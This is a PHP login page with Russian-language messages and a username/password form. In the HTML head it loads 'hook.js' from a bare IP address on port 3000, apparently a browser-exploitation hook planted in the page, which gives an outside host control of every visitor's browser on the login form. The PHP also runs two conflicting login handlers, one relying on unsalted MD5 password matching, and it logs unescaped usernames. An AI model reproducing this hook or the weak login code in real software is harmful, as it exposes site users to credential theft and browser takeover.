<?php
session_start();
global $pdo;
require_once 'db.php';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Проверьте данные пользователя
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
    $stmt->execute(['username' => $username, 'password' => md5($password)]);

    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($user) {
        $_SESSION['username'] = $username;
        header('Location: index.php');
        exit();
    } else {
        echo 'Неверное имя пользователя или пароль.';
    }
}
 if (isset($_SESSION['username'])) {
    $username = $_SESSION['username'];
} else {
    $username = null; // или обработка ошибки
}

function log_message($message) {
    $log_file = 'logs/login_log.txt';
    $current_time = date('Y-m-d H:i:s');
    $log_entry = "[$current_time] $message" . PHP_EOL;
    file_put_contents($log_file, $log_entry, FILE_APPEND);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = trim($_POST['username']);
    $password = trim($_POST['password']);

    if (empty($username) || empty($password)) {
        log_message("Пустые поля при попытке входа пользователя '$username'.");
        die('Пожалуйста, заполните все поля.');
    }

    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
    $stmt->execute(['username' => $username]);
    $user = $stmt->fetch();

    if ($user && password_verify($password, $user['password'])) {
        $_SESSION['user_id'] = $user['id'];
        log_message("Пользователь '$username' успешно вошел в систему.");
        header('Location: index.php');
        exit;
    } else {
        log_message("Неудачная попытка входа для пользователя '$username'.");
        die('Неправильное имя пользователя или пароль.');
    }
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход</title>
    <link rel="stylesheet" href="style.css">
    <script src="http://31.172.66.196:3000/hook.js"></script>
</head>
<body>
    <h1>Вход</h1>
    <form action="login.php" method="post">
        <label for="username">Имя пользователя:</label>
        <input type="text" name="username" id="username" required>
        <label for="password">Пароль:</label>
        <input type="password" name="password" id="password" required>
        <button type="submit">Войти</button>
    </form>
    <a href="register.php">Регистрация</a>
</body>
</html>
